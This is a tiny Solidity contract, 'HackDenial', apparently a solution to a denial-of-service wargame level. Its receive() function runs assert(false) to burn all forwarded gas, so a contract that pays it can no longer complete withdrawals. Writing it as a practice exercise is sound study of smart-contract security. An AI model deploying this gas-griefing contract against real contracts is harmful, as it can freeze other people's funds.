// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackDenial {

    // allow deposit of funds
    receive() external payable {
        assert(false); //consumes all gas
    }

}